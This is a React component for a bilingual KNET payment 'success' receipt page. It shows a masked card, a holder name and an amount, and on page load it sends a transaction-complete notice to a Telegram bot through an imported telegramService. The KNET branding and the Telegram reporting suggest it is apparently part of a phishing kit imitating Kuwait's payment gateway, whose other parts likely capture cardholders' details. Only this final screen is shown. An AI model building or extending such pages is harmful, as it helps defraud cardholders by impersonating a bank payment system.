import React from 'react';
import { CheckCircle, Download, Printer, CreditCard, Calendar, User, Hash, Home } from 'lucide-react';
import { TransactionData } from '../App';
import { telegramService } from '../services/telegramService';

interface ReceiptProps {
  transactionData: TransactionData;
  onNewTransaction: () => void;
  isRTL: boolean;
}

const Receipt: React.FC<ReceiptProps> = ({ transactionData, onNewTransaction, isRTL }) => {
  const currentDate = new Date();
  
  // إرسال إشعار اكتمال المعاملة عند تحميل الصفحة
  React.useEffect(() => {
    telegramService.sendTransactionComplete(transactionData.transactionId).catch(console.error);
  }, [transactionData.transactionId]);
  
  const handlePrint = () => {
    window.print();
  };

  const handleDownload = () => {
    const receiptData = `
KNET Payment Receipt
===================
Transaction ID: ${transactionData.transactionId}
Date: ${currentDate.toLocaleDateString()}
Time: ${currentDate.toLocaleTimeString()}
Amount: ${transactionData.amount} KWD
Bank: ${transactionData.bankCode}
Card: ****${transactionData.cardNumber?.slice(-4)}
Status: Successful
===================
    `;
    
    const blob = new Blob([receiptData], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `receipt-${transactionData.transactionId}.txt`;
    a.click();
    window.URL.revokeObjectURL(url);
  };

  return (
    <div className="bg-white rounded-xl shadow-xl overflow-hidden">
      <div className="bg-gradient-to-r from-green-500 to-green-600 p-6 text-white text-center">
        <CheckCircle className="h-16 w-16 mx-auto mb-4" />
        <h2 className="text-3xl font-bold mb-2">
          {isRTL ? 'تمت العملية بنجاح!' : 'Payment Successful!'}
        </h2>
        <p className="text-green-100">
          {isRTL ? 'تم تأكيد دفعتك بنجاح' : 'Your payment has been confirmed successfully'}
        </p>
      </div>

      <div className="p-8">
        <div className="border-2 border-dashed border-gray-200 rounded-lg p-6 mb-6">
          <div className="text-center mb-6">
            <h3 className="text-xl font-bold text-gray-800 mb-2">
              {isRTL ? 'إيصال الدفع الإلكتروني' : 'Electronic Payment Receipt'}
            </h3>
            <p className="text-gray-600 text-sm">
              {currentDate.toLocaleDateString()} - {currentDate.toLocaleTimeString()}
            </p>
          </div>

          <div className="space-y-4">
            <div className="flex items-center justify-between py-3 border-b border-gray-100">
              <div className="flex items-center space-x-2 rtl:space-x-reverse text-gray-600">
                <Hash className="h-4 w-4" />
                <span>{isRTL ? 'رقم المعاملة' : 'Transaction ID'}</span>
              </div>
              <span className="font-mono font-semibold text-blue-600">
                {transactionData.transactionId}
              </span>
            </div>

            <div className="flex items-center justify-between py-3 border-b border-gray-100">
              <div className="flex items-center space-x-2 rtl:space-x-reverse text-gray-600">
                <User className="h-4 w-4" />
                <span>{isRTL ? 'اسم حامل البطاقة' : 'Card Holder'}</span>
              </div>
              <span className="font-semibold">
                {transactionData.cardHolderName}
              </span>
            </div>

            <div className="flex items-center justify-between py-3 border-b border-gray-100">
              <div className="flex items-center space-x-2 rtl:space-x-reverse text-gray-600">
                <CreditCard className="h-4 w-4" />
                <span>{isRTL ? 'البطاقة' : 'Card'}</span>
              </div>
              <span className="font-mono">
                ****{transactionData.cardNumber?.slice(-4)} ({transactionData.bankCode})
              </span>
            </div>

            <div className="flex items-center justify-between py-3 border-b border-gray-100">
              <div className="flex items-center space-x-2 rtl:space-x-reverse text-gray-600">
                <Calendar className="h-4 w-4" />
                <span>{isRTL ? 'تاريخ المعاملة' : 'Transaction Date'}</span>
              </div>
              <span>
                {currentDate.toLocaleDateString()} {currentDate.toLocaleTimeString()}
              </span>
            </div>

            <div className="flex items-center justify-between py-3 bg-green-50 rounded-lg px-4">
              <div className="flex items-center space-x-2 rtl:space-x-reverse text-green-700 font-semibold">
                <CheckCircle className="h-5 w-5" />
                <span>{isRTL ? 'المبلغ المدفوع' : 'Amount Paid'}</span>
              </div>
              <span className="font-bold text-2xl text-green-700">
                {transactionData.amount} {isRTL ? 'د.ك' : 'KWD'}
              </span>
            </div>
          </div>
        </div>

        <div className="flex flex-col sm:flex-row gap-4 mb-6">
          <button
            onClick={handlePrint}
            className="flex-1 flex items-center justify-center space-x-2 rtl:space-x-reverse px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
          >
            <Printer className="h-5 w-5" />
            <span>{isRTL ? 'طباعة الإيصال' : 'Print Receipt'}</span>
          </button>
          
          <button
            onClick={handleDownload}
            className="flex-1 flex items-center justify-center space-x-2 rtl:space-x-reverse px-6 py-3 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors"
          >
            <Download className="h-5 w-5" />
            <span>{isRTL ? 'تحميل الإيصال' : 'Download Receipt'}</span>
          </button>
        </div>

        <button
          onClick={onNewTransaction}
          className="w-full flex items-center justify-center space-x-2 rtl:space-x-reverse px-6 py-4 bg-gradient-to-r from-green-600 to-green-700 text-white rounded-lg hover:from-green-700 hover:to-green-800 transition-all duration-300 transform hover:scale-[1.02] font-semibold text-lg"
        >
          <Home className="h-5 w-5" />
          <span>{isRTL ? 'معاملة جديدة' : 'New Transaction'}</span>
        </button>

        <div className="mt-6 p-4 bg-blue-50 rounded-lg">
          <p className="text-sm text-blue-800 text-center">
            {isRTL 
              ? 'احتفظ بهذا الإيصال كمرجع للمعاملة. في حالة وجود أي استفسارات، يرجى الاتصال بخدمة العملاء على الرقم 1828000'
              : 'Keep this receipt for your records. For any inquiries, please contact customer service at 1828000'
            }
          </p>
        </div>
      </div>
    </div>
  );
};

export default Receipt;